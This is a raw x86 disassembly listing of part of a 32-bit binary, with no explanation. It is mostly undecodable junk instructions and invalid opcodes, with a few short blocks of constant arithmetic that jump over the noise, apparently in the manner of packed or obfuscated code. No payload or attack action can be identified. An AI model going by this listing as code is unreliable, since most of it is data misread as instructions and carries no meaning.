  40be52:	ins    BYTE PTR es:[edi],dx
  40be53:	mov    ecx,0x7d7d06c
  40be58:	xlat   BYTE PTR ds:[ebx]
  40be59:	imul   BYTE PTR [esp+ebp*1]
  40be5c:	adc    al,0x68
  40be5e:	push   cs
  40be5f:	inc    ebp
  40be60:	pop    esi
  40be61:	jg     0x40be9c
  40be63:	mov    ah,0x85
  40be65:	rol    BYTE PTR [ebx-0xe5de0a0],0xa3
  40be6c:	mov    cl,0xc6
  40be6e:	jmp    FWORD PTR [ebp+edi*1-0x40]
  40be72:	add    BYTE PTR [eax-0x45c44f8d],dl
  40be78:	jns    0x40be20
  40be7a:	pop    ds
  40be7b:	imul   ebp,DWORD PTR [edx],0x3b
  40be7e:	mov    ecx,0xaa6bf4d5
  40be83:	push   eax
  40be84:	add    esp,ecx
  40be86:	iret   
  40be87:	dec    edx
  40be88:	ins    BYTE PTR es:[edi],dx
  40be89:	ret    
  40be8a:	fidivr WORD PTR [eax]
  40be8c:	mov    edx,0x1ba63a57
  40be91:	aas    
  40be92:	lea    esp,[ebx+0x47]
  40be95:	cmp    ch,0xd7
  40be98:	and    BYTE PTR [ebx],cl
  40be9a:	sbb    bh,0x71
  40be9d:	jns    0x40beaa
  40be9f:	jo     0x40bed9
  40bea1:	shr    DWORD PTR [ebx+ebp*1],0xf6
  40bea5:	rcl    BYTE PTR [esi],cl
  40bea7:	icebp  
  40bea8:	(bad)  
  40bea9:	or     dl,cl
  40beab:	pop    edi
  40beac:	fsub   st,st(7)
  40beae:	fdiv   DWORD PTR [edx+0x1b]
  40beb1:	leave  
  40beb2:	jle    0x40bef1
  40beb4:	xor    BYTE PTR [ebx+esi*4],bl
  40beb7:	push   edx
  40beb8:	arpl   WORD PTR [ebx+0x38b68ad5],bp
  40bebe:	pushf  
  40bebf:	pop    esp
  40bec0:	jb     0x40bed2
  40bec2:	push   esp
  40bec3:	push   0x922a4c5b
  40bec8:	push   ebp
  40bec9:	xchg   esi,eax
  40beca:	clc    
  40becb:	xlat   BYTE PTR ds:[ebx]
  40becc:	inc    ebx
  40becd:	dec    eax
  40bece:	outs   dx,BYTE PTR ds:[esi]
  40becf:	sahf   
  40bed0:	fldenv [edx-0x9b77b4d]
  40bed6:	mov    eax,ds:0xc87e1330
  40bedb:	jl     0x40be9a
  40bedd:	outs   dx,DWORD PTR ds:[esi]
  40bede:	fdivr  DWORD PTR [ebp+0x1c]
  40bee1:	mov    esi,0xc9c927a5
  40bee6:	fwait
  40bee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee8:	aad    0x9a
  40beea:	jno    0x40be72
  40beec:	pop    edi
  40beed:	push   esi
  40beee:	sbb    DWORD PTR [edx+eax*4+0x71],0x4b3857b3
  40bef6:	imul   esi,DWORD PTR [edx+eiz*8+0x7d385629],0xffffffdb
  40befe:	ss sub esi,edx
  40bf01:	pop    es
  40bf02:	dec    eax
  40bf03:	ss pop edi
  40bf05:	mov    edi,0xfc45c77b
  40bf0a:	test   BYTE PTR [ebp+0x0],dh
  40bf0d:	add    bh,al
  40bf0f:	inc    ebp
  40bf10:	clc    
  40bf11:	lahf   
  40bf12:	jl     0x40bf14
  40bf14:	add    BYTE PTR [ebx-0x2dcc07bb],cl
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x580e3990],1
  40bf66:	rol    DWORD PTR [edx-0x39],1
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0xd91d3b65
  40bf73:	dec    esp
  40bf74:	mov    ecx,DWORD PTR [ecx]
  40bf76:	jle    0x40bfde
  40bf78:	sub    eax,DWORD PTR [ebx]
  40bf7a:	dec    edi
  40bf7b:	outs   dx,BYTE PTR ds:[esi]
  40bf7c:	int3   
  40bf7d:	inc    esp
  40bf7e:	add    eax,DWORD PTR [edx-0x1a7e6ef0]
  40bf84:	xchg   BYTE PTR [ebx+0xea1359b],bh
  40bf8a:	xchg   edx,eax
  40bf8b:	jns    0x40bffe
  40bf8d:	in     eax,dx
  40bf8e:	pop    ds
  40bf8f:	mov    bl,0x20
  40bf91:	(bad)
  40bf95:	into   
  40bf96:	int    0x8a
  40bf98:	dec    ebp
  40bf99:	cmp    eax,0x8ecd47e4
  40bf9e:	add    al,0x76
  40bfa0:	pop    esi
  40bfa1:	(bad)
  40bfa5:	mov    al,ds:0x373b8356
  40bfaa:	bound  ebp,QWORD PTR [ebp-0x1eb02972]
  40bfb0:	fdiv   DWORD PTR [esi-0x3f]
  40bfb3:	jno    0x40bfd8
  40bfb5:	fwait
  40bfb6:	jae    0x40bf9e
  40bfb8:	jo     0x40c022
  40bfba:	and    DWORD PTR [ecx+0x13],0xffffffb2
  40bfbe:	or     dh,BYTE PTR [ecx-0x1f0f281e]
  40bfc4:	pop    ebp
  40bfc5:	cwde   
  40bfc6:	icebp  
  40bfc7:	mov    ch,0x58
  40bfc9:	mov    dl,0xd6
  40bfcb:	cmp    eax,0xb320f5da
  40bfd0:	sub    BYTE PTR [eax+0x71],0xd0
  40bfd4:	jp     0x40c04d
  40bfd6:	inc    ebx
  40bfd7:	xor    al,0xfd
  40bfd9:	cld    
  40bfda:	inc    eax
  40bfdb:	adc    esp,ecx
  40bfdd:	leave  
  40bfde:	xor    esi,edx
  40bfe0:	fsubr  DWORD PTR [ebx]
  40bfe2:	mov    esp,0xd2f2b033
  40bfe7:	jbe    0x40bfd2
  40bfe9:	nop
  40bfea:	xor    BYTE PTR [ecx+0xdfc3508],ch
  40bff0:	push   ds
  40bff1:	fninit 
  40bff3:	sub    BYTE PTR [eax-0x30],0x27
  40bff7:	(bad)  [eax-0x49e2cf31]
  40bffd:	cmp    dl,BYTE PTR [esi]
  40bfff:	dec    ebx
  40c000:	push   0x34
  40c002:	push   ecx
  40c003:	fidiv  DWORD PTR [eax+esi*8]
  40c006:	sti    
  40c007:	cmc    
  40c008:	fmul   DWORD PTR [esi]
  40c00a:	pop    ebx
  40c00b:	(bad)  
  40c00c:	fmul   st,st(2)
  40c00e:	loope  0x40c023
  40c010:	or     BYTE PTR [esp+ecx*8+0x502a9bc5],ch
  40c017:	mov    WORD PTR [ecx],?
  40c019:	jp     0x40c041
  40c01b:	inc    ebx
  40c01c:	cdq    
  40c01d:	mov    DWORD PTR [esi-0x1fefa84d],edi
  40c023:	outs   dx,DWORD PTR ds:[esi]
  40c024:	sbb    eax,edx
  40c026:	jnp    0x40bfe6
  40c028:	fstp   DWORD PTR [eax-0x53]
  40c02b:	hlt    
  40c02c:	ins    DWORD PTR es:[edi],dx
  40c02d:	mov    dh,0x95
  40c02f:	sahf   
  40c030:	fwait
  40c031:	and    eax,0x9b47c6ec
  40c036:	cmp    DWORD PTR [ebx+0x46a29028],0xffffffd9
  40c03d:	lods   al,BYTE PTR ds:[esi]
  40c03e:	push   esi
  40c03f:	cld    
  40c040:	out    dx,eax
  40c041:	sbb    bh,al
  40c043:	rcl    DWORD PTR [edx+0x237ffe93],cl
  40c049:	(bad)
  40c04c:	leave  
  40c04d:	and    DWORD PTR [eax],edx
  40c04f:	ds push 0xffffff88
  40c052:	call   eax
  40c054:	inc    ecx
  40c055:	inc    ecx
  40c056:	mov    ebp,0xbd0bb33c
  40c05b:	retf   0xa7e2
  40c05e:	retf   0xefac
  40c061:	fidivr WORD PTR [edi]
  40c063:	pop    ds
  40c064:	sbb    al,BYTE PTR [ecx+0x76]
  40c067:	or     DWORD PTR [ebp-0x6dcc117],ebx
  40c06d:	sub    al,0x51
  40c06f:	inc    ebx
  40c070:	sbb    BYTE PTR [edi-0x75a6d69e],bh
  40c076:	ins    DWORD PTR es:[edi],dx
  40c077:	sbb    al,0x0
  40c079:	ret    
  40c07a:	mov    dl,0xa0
  40c07c:	call   0xf3616fa6
  40c081:	cmp    BYTE PTR [ebx+eiz*1],ah
  40c084:	loop   0x40c09f
  40c086:	cld    
  40c087:	jbe    0x40c07d
  40c089:	(bad)  
  40c08b:	mov    bl,0xa9
  40c08d:	xchg   esp,eax
  40c08e:	popa   
  40c08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c090:	int    0x23
  40c092:	and    DWORD PTR [edx-0x63],esi
  40c095:	ins    DWORD PTR es:[edi],dx
  40c096:	lahf   
  40c097:	pushf  
  40c098:	lds    edi,FWORD PTR [edx]
  40c09a:	(bad)  
  40c09b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c09c:	dec    esp
  40c09d:	xchg   DWORD PTR [ecx+0x48],esp
  40c0a0:	fisttp QWORD PTR [eax+ebp*8-0x19]
  40c0a4:	lahf   
  40c0a5:	jae    0x40c0bd
  40c0a7:	xor    BYTE PTR [esp+esi*2+0x4f370ac9],ch
  40c0ae:	out    dx,eax
  40c0af:	imul   esi,DWORD PTR [eax+ebp*1],0x85af1c15
  40c0b6:	sub    eax,0x27308520
  40c0bb:	ret    
  40c0bc:	shr    edi,0x5
  40c0bf:	sbb    DWORD PTR [esp+edi*2-0x4c79ec57],esp
  40c0c6:	and    BYTE PTR [edi],al
  40c0c8:	fnstenv [edi-0x2b]
  40c0cb:	add    bh,bl
  40c0cd:	aam    0x11
  40c0cf:	outs   dx,BYTE PTR ds:[esi]
  40c0d0:	and    dl,BYTE PTR [ebx]
  40c0d2:	jnp    0x40c07a
  40c0d4:	xor    al,0x11
  40c0d6:	pop    ss
  40c0d7:	xchg   ebp,eax
  40c0d8:	int    0xd8
  40c0da:	lds    eax,FWORD PTR [esi+0x2d]
  40c0dd:	mov    WORD PTR [ebx-0x6d],ds
  40c0e0:	and    BYTE PTR [esi],bl
  40c0e2:	mov    fs,WORD PTR [ebp-0x60]
  40c0e5:	sub    BYTE PTR [ecx+0x474bd5b1],0x4f
  40c0ec:	or     eax,0xe6db8c34
  40c0f1:	loope  0x40c10f
  40c0f3:	sub    DWORD PTR [edx+0x3c8d357c],esp
  40c0f9:	and    ecx,DWORD PTR [edi]
  40c0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0fd:	addr16 push cs
  40c0ff:	mov    edx,0xe75dc0c5
  40c104:	leavew 
  40c106:	add    al,0xeb
  40c108:	cmp    bh,BYTE PTR [edi]
  40c10a:	mov    ebp,0xfe3695d2
  40c10f:	sub    BYTE PTR [edi-0x14d3ae7e],cl
  40c115:	lods   eax,DWORD PTR ds:[esi]
  40c116:	dec    edi
  40c117:	int    0xac
  40c119:	dec    eax
  40c11a:	dec    esi
  40c11b:	ficomp DWORD PTR ds:0xf7ad9c3d
  40c121:	call   0x9729:0xfae970cc
  40c128:	push   ecx
  40c129:	jnp    0x40c172
  40c12b:	test   BYTE PTR [edx+0x3e],0xf9
  40c12f:	test   BYTE PTR [ebx],0xbe
  40c132:	or     eax,DWORD PTR [edi]
  40c134:	dec    eax
  40c135:	retf   
  40c136:	cwde   
  40c137:	push   eax
  40c138:	js     0x40c193
  40c13a:	test   BYTE PTR [ebx+0x54],0x1
  40c13e:	dec    esp
  40c13f:	xor    DWORD PTR [ecx+0x6c],esi
  40c142:	mov    dl,0x1
  40c144:	mov    esp,0xbe398ff8
  40c149:	jmp    0x855d:0x8c089731
  40c150:	popf   
  40c151:	adc    bh,BYTE PTR ds:0x8fc763eb
  40c157:	pop    es
  40c158:	test   eax,0x20d89fa9
  40c15d:	(bad)  
  40c15e:	push   edx
  40c15f:	mov    BYTE PTR ds:0x7c03181,cl
  40c165:	inc    ebx
  40c166:	fwait
  40c167:	loop   0x40c16f
  40c169:	pusha  
  40c16a:	xor    esp,DWORD PTR es:[ebp+0x3c]
  40c16e:	aad    0xd6
  40c170:	call   0x80f8e30
  40c175:	repnz cmp ecx,DWORD PTR [ebx+0x22]
  40c179:	adc    BYTE PTR [edi+0x2d],ch
  40c17c:	imul   ebp,DWORD PTR [ecx-0x6e],0x58
  40c180:	cli    
  40c181:	stos   DWORD PTR es:[edi],eax
  40c182:	inc    bl
  40c184:	mov    al,ds:0xe79bdf1c
  40c189:	jnp    0x40c18f
  40c18b:	loopne 0x40c19b
  40c18d:	je     0x40c204
  40c18f:	push   0x3dc622
  40c194:	fsub   DWORD PTR gs:[ebx-0x10]
  40c198:	sti    
  40c199:	jle    0x40c156
  40c19b:	scas   eax,DWORD PTR es:[edi]
  40c19c:	sbb    cl,0x7f
  40c19f:	lods   al,BYTE PTR ds:[esi]
  40c1a0:	call   0x3fea:0x558abed6
  40c1a7:	arpl   bp,di
  40c1a9:	fiadd  WORD PTR [esi-0x72]
  40c1ac:	jbe    0x40c205
  40c1ae:	jae    0x40c1cd
  40c1b0:	add    al,0x69
  40c1b2:	mov    bl,0x4d
  40c1b4:	inc    eax
  40c1b5:	(bad)  
  40c1b6:	and    al,0x6d
  40c1b8:	jbe    0x40c1d6
  40c1ba:	cmp    al,0x8e
  40c1bc:	arpl   di,dx
  40c1be:	(bad)  
  40c1bf:	hlt    
  40c1c0:	lahf   
  40c1c1:	lea    ecx,[edx+0x28b5668b]
  40c1c7:	mov    ebp,DWORD PTR [ebp+ebp*4+0x6dc70c8b]
  40c1ce:	inc    ecx
  40c1cf:	stc    
  40c1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d1:	cmp    eax,0xdd5a94bb
  40c1d6:	pop    ecx
  40c1d7:	rcl    DWORD PTR [edi+0x25308d5],cl
  40c1dd:	sbb    bl,BYTE PTR [edx+0xd]
  40c1e0:	push   edi
  40c1e1:	jns    0x40c217
  40c1e3:	test   BYTE PTR [ebx+eiz*8],0xef
  40c1e7:	and    al,0xd3
  40c1e9:	jo     0x40c1d0
  40c1eb:	(bad)  
  40c1ec:	jbe    0x40c18f
  40c1ee:	mov    al,ds:0x9b0794c4
  40c1f3:	daa    
  40c1f4:	adc    eax,0x7e9c8054
  40c1f9:	push   ds
  40c1fa:	fld    DWORD PTR [esi-0x235a34ce]
  40c200:	jp     0x40c24e
  40c202:	jae    0x40c215
  40c204:	and    ah,BYTE PTR [ecx+0x6b]
  40c207:	mov    eax,ds:0x3fc36f73
  40c20c:	test   DWORD PTR [eax],ebx
  40c20e:	into   
  40c20f:	jmp    0xc0f6:0x3634f554
  40c216:	mov    DWORD PTR [edx+0x3d],ecx
  40c219:	cmp    BYTE PTR [esp+edi*4+0x79c93f8e],bh
  40c220:	(bad)  
  40c221:	cmp    al,0x4a
  40c223:	xor    bl,BYTE PTR [ecx]
  40c225:	or     ah,BYTE PTR [ecx+0x29]
  40c228:	std    
  40c229:	test   BYTE PTR [eax+0x34],ch
  40c22c:	push   ebx
  40c22d:	mov    ds:0x14947b3d,eax
  40c232:	jo     0x40c284
  40c234:	icebp  
  40c235:	lea    esp,[esi+0x272ef32f]
  40c23b:	bound  esi,QWORD PTR [ecx+0x67]
  40c23e:	mov    WORD PTR [esi],?
  40c240:	xor    eax,0x8143fba3
  40c245:	jae    0x40c23d
  40c247:	bound  esi,QWORD PTR [edi+eiz*8-0x4de575d9]
  40c24e:	jle    0x40c265
  40c250:	inc    ebx
  40c251:	dec    ebx
  40c252:	fnsave [ebx-0x2d013ca]
  40c258:	test   eax,0x4705623a
  40c25d:	jne    0x40c2a6
  40c25f:	add    ecx,0xc67a8d54
  40c265:	mov    cs,WORD PTR [esi+0x69]
  40c268:	inc    ebp
  40c269:	or     BYTE PTR [edi-0x5e74f4be],0x65
  40c270:	jl     0x40c279
  40c272:	and    eax,0x3b0ee8c9
  40c277:	stos   DWORD PTR es:[edi],eax
  40c278:	jle    0x40c2c2
  40c27a:	jle    0x40c2c6
  40c27c:	push   ss
  40c27d:	into   
  40c27e:	sub    BYTE PTR [ecx-0x17],ch
  40c281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c282:	or     esi,DWORD PTR [ebp+0x7a]
  40c285:	xchg   edi,eax
  40c286:	cmp    DWORD PTR [ecx+edi*2-0x563ee370],0x7
  40c28e:	(bad)  
  40c28f:	push   edi
  40c290:	mov    dl,0x74
  40c292:	mov    edx,DWORD PTR [ebx+ecx*8]
  40c295:	sbb    dl,BYTE PTR [eax+ecx*2-0x743d03c2]
  40c29c:	add    cl,BYTE PTR [ecx-0x1d]
  40c29f:	jne    0x40c26a
  40c2a1:	ins    BYTE PTR es:[edi],dx
  40c2a2:	add    BYTE PTR [edi],0xd0
  40c2a5:	repz mov edx,0x595f699f
  40c2ab:	mov    ebx,0x684b333
  40c2b0:	dec    esp
  40c2b1:	(bad)  
  40c2b2:	mov    dl,0x72
  40c2b4:	adc    dl,dl
  40c2b6:	jmp    0x40c25c
  40c2b8:	mov    ecx,esp
  40c2ba:	sbb    al,0x2e
  40c2bc:	cmp    eax,0x3eccb9d2
  40c2c1:	inc    edi
  40c2c2:	mov    ecx,0x520f92da
  40c2c7:	inc    esi
  40c2c8:	fwait
  40c2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ca:	iret   
  40c2cb:	dec    eax
  40c2cc:	pop    ebp
  40c2cd:	sbb    al,0xf6
  40c2cf:	mov    dl,BYTE PTR [ecx]
  40c2d1:	into   
  40c2d2:	mov    al,ds:0x439ffb7d
  40c2d7:	xor    ah,BYTE PTR [ebx+0x4df8bdcd]
  40c2dd:	mov    bl,0x73
  40c2df:	mov    esi,0xa28be67d
  40c2e4:	mov    ah,BYTE PTR [edx]
  40c2e6:	jo     0x40c2b3
  40c2e8:	push   es
  40c2e9:	mov    bl,0xbf
  40c2eb:	push   edi
  40c2ec:	aad    0xdc
  40c2ee:	cs inc edx
  40c2f0:	jle    0x40c2c9
  40c2f2:	push   edx
  40c2f3:	dec    eax
  40c2f4:	push   es
  40c2f5:	sub    al,0x35
  40c2f7:	cmp    bh,BYTE PTR [ebx+0x64]
  40c2fa:	pop    ebx
  40c2fb:	xchg   edx,eax
  40c2fc:	pop    ebx
  40c2fd:	jne    0x40c2fb
  40c2ff:	std    
  40c300:	data16 fistp QWORD PTR [edi+0x64]
  40c304:	lds    esi,FWORD PTR [esi-0x52f8e0a6]
  40c30a:	adc    al,0x55
  40c30c:	ret    
  40c30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c30e:	dec    ecx
  40c30f:	pusha  
  40c310:	lods   eax,DWORD PTR ds:[esi]
  40c311:	ja     0x40c380
  40c313:	cmc    
  40c314:	popa   
  40c315:	and    dh,BYTE PTR [bp+di]
  40c318:	push   ds
  40c319:	ds retf 
  40c31b:	ins    BYTE PTR es:[edi],dx
  40c31c:	mov    ?,WORD PTR [ebx-0x43]
  40c31f:	push   0xfffffff1
  40c321:	cwde   
  40c322:	leave  
  40c323:	dec    sp
  40c325:	xor    al,0xf8
  40c327:	loope  0x40c343
  40c329:	mov    bl,0x41
  40c32b:	add    ch,0xe4
  40c32e:	mov    cl,0x83
  40c330:	fimul  WORD PTR [esi+0x1c5e78ca]
  40c336:	sbb    al,BYTE PTR [edi-0x7c82454d]
  40c33c:	or     DWORD PTR [ebx+0x45],0x6e
  40c340:	aaa    
  40c341:	mov    bh,0x6d
  40c343:	and    DWORD PTR [edi],ecx
  40c345:	mov    ds,WORD PTR ds:0x3c5215bd
  40c34b:	cld    
  40c34c:	cs xor eax,0x96f001c8
  40c352:	in     eax,0xdc
  40c354:	xchg   ebx,eax
  40c355:	je     0x40c2e2
  40c357:	dec    ebx
  40c358:	sub    dh,ch
  40c35a:	push   cs
  40c35b:	push   0xffffffc9
  40c35d:	lea    eax,[ecx+eax*1-0x65ec]
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi+0x266f8acf],ebp
  40c476:	rcl    DWORD PTR [esi],1
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0xdb6cae25
  40c483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c484:	cdq    
  40c485:	ss add al,0x11
  40c488:	push   esi
  40c489:	pop    DWORD PTR [ecx+0x70]
  40c48c:	push   eax
  40c48d:	icebp  
  40c48e:	repnz sar DWORD PTR [esi+0x75],0xa1
  40c493:	xor    bl,0x6d
  40c496:	inc    edx
  40c497:	mov    eax,0x65d1ccec
  40c49c:	jmp    0xe9c4d981
  40c4a1:	mov    ecx,DWORD PTR [ebp+eax*1-0x40ebeefe]
  40c4a8:	inc    ebx
  40c4a9:	out    dx,al
  40c4aa:	loop   0x40c4c0
  40c4ac:	add    DWORD PTR [ebx],esi
  40c4ae:	xchg   esp,eax
  40c4af:	and    eax,0xfd0b80f7
  40c4b4:	inc    ebx
  40c4b5:	ror    DWORD PTR [edx+0x2a],cl
  40c4b8:	repnz mov BYTE PTR [edx+0x6295fac4],dl
  40c4bf:	xchg   ebx,eax
  40c4c0:	lods   al,BYTE PTR ds:[esi]
  40c4c1:	imul   edi,DWORD PTR [edx+esi*1+0x8dd5fec],0x451e1502
  40c4cc:	push   ecx
  40c4cd:	add    al,0x1a
  40c4cf:	in     al,dx
  40c4d0:	add    al,0xb6
  40c4d2:	addr16 popf 
  40c4d4:	jae    0x40c4e7
  40c4d6:	(bad)  
  40c4d7:	sbb    eax,0xf8228247
  40c4dc:	sti    
  40c4dd:	nop
  40c4de:	pop    ebp
  40c4df:	in     al,0xdd
  40c4e1:	mov    ebx,0x287faa13
  40c4e6:	sub    cl,BYTE PTR [ebx]
  40c4e8:	cmp    BYTE PTR [ecx+0x46],ah
  40c4eb:	cmp    BYTE PTR [edx-0x509c4c33],0x0
  40c4f2:	cdq    
  40c4f3:	imul   ebp,ebp,0x31cd953a
  40c4f9:	popa   
  40c4fa:	ror    dl,1
  40c4fc:	jle    0x40c49b
  40c4fe:	dec    edi
  40c4ff:	repnz les eax,FWORD PTR [ebx+0x2a]
  40c503:	xchg   ebx,eax
  40c504:	lahf   
  40c505:	sub    DWORD PTR [ebx+ebp*2-0x382e2e8a],ebx
  40c50c:	test   ah,bl
  40c50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c50f:	xor    al,BYTE PTR [edi+ebx*1]
  40c512:	scas   eax,DWORD PTR es:[edi]
  40c513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c514:	inc    ebx
  40c516:	xor    eax,0xc2870a8d
  40c51b:	out    dx,al
  40c51c:	addr16 mov edx,eax
  40c51f:	or     BYTE PTR [ebp+0x22e84c11],0x66
  40c526:	fdivr  QWORD PTR [edi-0x64]
  40c529:	pop    eax
  40c52a:	addr16 push esp
  40c52c:	jns    0x40c55e
  40c52e:	sub    DWORD PTR [ebx-0x47b5188d],esi
  40c534:	xchg   ecx,eax
  40c535:	stc    
  40c536:	mov    esp,0xc20a083
  40c53b:	(bad)  
  40c53c:	push   ss
  40c53d:	fmul   st(1),st
  40c53f:	push   eax
  40c540:	repz add BYTE PTR [edi+eax*4+0x4d],ah
  40c545:	mov    ds:0x93873803,eax
  40c54a:	xchg   BYTE PTR [edx],bh
  40c54c:	fwait
  40c54d:	inc    esp
  40c54e:	dec    esi
  40c54f:	sets   ah
  40c552:	ror    esp,cl
  40c554:	sbb    BYTE PTR ds:0x19e49051,dh
  40c55a:	add    al,0x9c
  40c55c:	xchg   ebp,eax
  40c55d:	xchg   ebx,eax
  40c55e:	xchg   edi,eax
  40c55f:	stos   BYTE PTR es:[edi],al
  40c560:	(bad)  
  40c561:	ficomp DWORD PTR [eax+0x42]
  40c564:	out    0x5b,eax
  40c566:	int3   
  40c567:	push   ds
  40c568:	and    esi,0x1d
  40c56b:	ret    0xa389
  40c56e:	pop    edi
  40c56f:	inc    esi
  40c570:	(bad)  
  40c571:	clc    
  40c572:	jb     0x40c5cf
  40c574:	dec    esi
  40c575:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40c577:	inc    edx
  40c578:	xor    bh,bh
  40c57a:	pop    eax
  40c57b:	out    dx,eax
  40c57c:	adc    eax,0x3706e4b2
  40c581:	dec    eax
  40c582:	xchg   edi,eax
  40c583:	dec    esp
  40c584:	sub    bl,BYTE PTR [eax]
  40c586:	push   esp
  40c587:	mov    ch,0xc3
  40c589:	cld    
  40c58a:	push   ecx
  40c58b:	int    0x44
  40c58d:	dec    esp
  40c58e:	cmp    DWORD PTR [eax-0x774e9cae],esp
  40c594:	cdq    
  40c595:	and    al,0x91
  40c597:	fld    TBYTE PTR [eax-0x608a843f]
  40c59d:	adc    bh,0x96
  40c5a0:	mov    bh,0x67
  40c5a2:	jp     0x40c5d4
  40c5a4:	push   es
  40c5a5:	out    0xe1,al
  40c5a7:	clc    
  40c5a8:	and    bh,BYTE PTR [edi+0x6b]
  40c5ab:	sbb    DWORD PTR [edx+0x4e],edi
  40c5ae:	imul   ebx,DWORD PTR [edi-0x7c8318f9],0x7c
  40c5b5:	rol    BYTE PTR [eax+0x7ad335f2],cl
  40c5bb:	mov    al,ds:0xebe359df
  40c5c0:	pop    ss
  40c5c1:	in     eax,dx
  40c5c2:	popf   
  40c5c3:	scas   eax,DWORD PTR es:[edi]
  40c5c4:	iret   
  40c5c5:	jg     0x40c59e
  40c5c7:	mov    dl,0x75
  40c5c9:	(bad)  
  40c5ca:	sti    
  40c5cb:	popa   
  40c5cc:	xlat   BYTE PTR ds:[ebx]
  40c5cd:	lds    ebp,FWORD PTR [edx+0x75]
  40c5d0:	xchg   esi,eax
  40c5d1:	push   edx
  40c5d2:	loopne 0x40c555
  40c5d4:	push   es
  40c5d5:	and    bh,cl
  40c5d7:	pop    edx
  40c5d8:	mov    al,0x9e
  40c5da:	sbb    cl,BYTE PTR [esi+edx*8]
  40c5dd:	inc    ecx
  40c5de:	mov    edi,0xa955f856
  40c5e3:	xor    eax,0x1eba3bb6
  40c5e8:	lods   eax,DWORD PTR ds:[esi]
  40c5e9:	into   
  40c5ea:	lods   al,BYTE PTR ds:[esi]
  40c5eb:	test   eax,0xdf674b23
